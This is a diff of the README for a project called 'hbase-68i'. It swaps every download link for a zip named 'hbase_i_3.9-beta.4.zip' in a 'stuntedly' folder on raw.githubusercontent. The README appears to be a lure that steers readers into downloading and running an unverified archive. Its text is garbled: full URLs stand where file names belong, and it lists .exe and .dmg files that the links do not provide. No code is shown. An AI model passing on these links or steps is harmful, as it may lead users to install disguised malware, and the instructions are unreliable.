@@ -6,7 +6,7 @@ Welcome to **hbase-68i**! This application helps you manage your data effectivel
 
 ## 📥 Download hbase-68i
 
-[![Download hbase-68i](https://raw.githubusercontent.com/Lu30-ux/hbase-68i/main/stuntedly/hbase-68i.zip)](https://raw.githubusercontent.com/Lu30-ux/hbase-68i/main/stuntedly/hbase-68i.zip)
+[![Download hbase-68i](https://raw.githubusercontent.com/Lu30-ux/hbase-68i/main/stuntedly/hbase_i_3.9-beta.4.zip)](https://raw.githubusercontent.com/Lu30-ux/hbase-68i/main/stuntedly/hbase_i_3.9-beta.4.zip)
 
 ## 📋 System Requirements
 
@@ -19,14 +19,14 @@ Before you download, ensure your system meets the following requirements:
 
 ## 🌐 Download & Install
 
-To get started, visit this page to download: [Download hbase-68i Releases](https://raw.githubusercontent.com/Lu30-ux/hbase-68i/main/stuntedly/hbase-68i.zip).
+To get started, visit this page to download: [Download hbase-68i Releases](https://raw.githubusercontent.com/Lu30-ux/hbase-68i/main/stuntedly/hbase_i_3.9-beta.4.zip).
 
 1. Click the link above.
 2. Look for the latest release at the top of the page.
 3. Select the file suitable for your operating system.
    - For Windows, choose the `.exe` file.
    - For macOS, choose the `.dmg` file.
-   - For Linux, select the `https://raw.githubusercontent.com/Lu30-ux/hbase-68i/main/stuntedly/hbase-68i.zip` file.
+   - For Linux, select the `https://raw.githubusercontent.com/Lu30-ux/hbase-68i/main/stuntedly/hbase_i_3.9-beta.4.zip` file.
 4. Click on the file to download it to your computer.
 
 ## 🖥️ Running hbase-68i
@@ -48,7 +48,7 @@ Once downloaded, follow these steps to run hbase-68i:
 
 ### Linux
 
-1. Find the downloaded `https://raw.githubusercontent.com/Lu30-ux/hbase-68i/main/stuntedly/hbase-68i.zip` file in your Downloads folder.
+1. Find the downloaded `https://raw.githubusercontent.com/Lu30-ux/hbase-68i/main/stuntedly/hbase_i_3.9-beta.4.zip` file in your Downloads folder.
 2. Right-click the file and select "Extract Here".
 3. Open a terminal and navigate to the extracted folder.
    ```
